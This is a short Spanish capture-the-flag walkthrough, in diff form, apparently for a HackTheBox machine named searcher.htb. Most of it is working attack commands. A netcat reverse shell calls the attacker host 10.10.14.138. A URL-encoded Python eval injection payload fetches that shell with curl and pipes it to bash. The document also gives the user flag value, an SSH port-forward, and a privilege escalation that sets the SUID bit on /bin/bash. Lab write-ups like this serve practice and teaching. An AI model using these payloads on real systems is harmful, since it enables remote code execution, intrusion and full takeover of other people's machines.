@@ -1,0 +1,31 @@
+SH:
+-nano rev.sh
+"
+#!/bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.138 4444 >/tmp/f
+"
+
+MONTAMOS EL SERVIDOR DE PYTHON QUE ESCUCHA EL SH Y ESCUCHAMOS:
+sudo python3 -m http.server 80
+sudo nc -nlvp 4444
+
+EN BURP SUITE CAMBIAMOS LA QUERY CON EVAL Y PYTHON PARA QUE SE DESCARGUE NUESTRA SHELL REVERSE:
+"
+http%3a//127.0.0.1/'%2beval(compile('for+x+in+range(1)%3a\n+import+os\n+os.system("curl%20http%3A%2F%2F10.10.14.138%2Frev.sh%7Cbash")','a','single'))%2b'
+"
+
+CAPTURAMOS LA FLAG USER:
+Con el comando "cat /home/svc/user.txt" en la shell reversa se ve que es "3e43bc489f2ef372f58d834946219d6c".
+
+SEGUIMOS INVESTIGANDO:
+·Con "ls -la" vemos un .git y si entramos vemos el archivo de configuración "cat config".
+·Traemos el puerto que habíamos encontrado antes a nuestra máquina con "ssh -L 3000:127.0.0.1:3000 svc@searcher.htb"
+
+
+ESCALADA DE PRIVILEGIOS:
+Creamos un archivo bash con:
+"
+#!/bin/bash     
+chmod +s /bin/bash
+"
+Lo ejecutamos pasándole el nombre del archivo creado y listo.
